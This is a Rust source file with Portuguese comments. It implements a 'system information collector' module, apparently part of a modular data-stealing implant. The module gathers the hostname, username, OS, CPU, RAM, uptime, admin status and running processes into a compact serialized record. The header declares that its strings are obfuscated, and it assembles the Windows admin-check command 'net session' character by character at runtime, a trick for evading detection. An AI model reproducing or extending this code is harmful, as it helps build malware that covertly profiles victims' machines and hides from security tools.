//! Coletor de Informações do Sistema
//!
//! ⚠️ Strings ofuscadas

use std::hint::black_box;
use serde::{Deserialize, Serialize};
use sysinfo::System;

#[cfg(unix)]
use nix::unistd::geteuid;

use super::{Collector, CollectorError, ModuleData};

#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    black_box(s)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemData {
    #[serde(rename = "h")]
    pub hostname: String,
    
    #[serde(rename = "u")]
    pub username: String,
    
    #[serde(rename = "o")]
    pub os_name: String,
    
    #[serde(rename = "v")]
    pub os_version: String,
    
    #[serde(rename = "a")]
    pub arch: String,
    
    #[serde(rename = "c")]
    pub cpu_model: String,
    
    #[serde(rename = "n")]
    pub cpu_cores: u32,
    
    #[serde(rename = "r")]
    pub ram_total: u64,
    
    #[serde(rename = "m")]
    pub ram_available: u64,
    
    #[serde(rename = "i")]
    pub is_admin: bool,
    
    #[serde(rename = "t")]
    pub uptime_seconds: u64,
    
    #[serde(rename = "p")]
    pub running_processes: Vec<String>,
}

pub struct SystemInfoCollector;

impl SystemInfoCollector {
    pub fn new() -> Self {
        Self
    }
    
    fn collect_system_data(&self) -> Result<SystemData, CollectorError> {
        let mut sys = System::new_all();
        sys.refresh_all();
        
        let processes: Vec<String> = sys.processes()
            .values()
            .map(|p| p.name().to_string())
            .take(100)
            .collect();
        
        let cpu_model = sys.cpus()
            .first()
            .map(|c| c.brand().to_string())
            .unwrap_or_else(|| bs(&['?']));
        
        Ok(SystemData {
            hostname: System::host_name().unwrap_or_else(|| bs(&['?'])),
            username: whoami::username(),
            os_name: System::name().unwrap_or_else(|| bs(&['?'])),
            os_version: System::os_version().unwrap_or_else(|| bs(&['?'])),
            arch: std::env::consts::ARCH.to_string(),
            cpu_model,
            cpu_cores: sys.cpus().len() as u32,
            ram_total: sys.total_memory(),
            ram_available: sys.available_memory(),
            is_admin: Self::check_admin(),
            uptime_seconds: System::uptime(),
            running_processes: processes,
        })
    }
    
    #[cfg(windows)]
    fn check_admin() -> bool {
        // Comando construído em runtime
        let cmd = bs(&['n', 'e', 't']);
        let arg = bs(&['s', 'e', 's', 's', 'i', 'o', 'n']);
        
        std::process::Command::new(&cmd)
            .arg(&arg)
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
    }
    
    #[cfg(unix)]
    fn check_admin() -> bool {
        geteuid().is_root()
    }
}

impl Default for SystemInfoCollector {
    fn default() -> Self {
        Self::new()
    }
}

impl Collector for SystemInfoCollector {
    fn name(&self) -> &str {
        "s"
    }
    
    fn collect(&self) -> Result<ModuleData, CollectorError> {
        let data = self.collect_system_data()?;
        Ok(ModuleData::System(data))
    }
    
    fn is_supported(&self) -> bool {
        true
    }
    
    fn priority(&self) -> u8 {
        100
    }
}
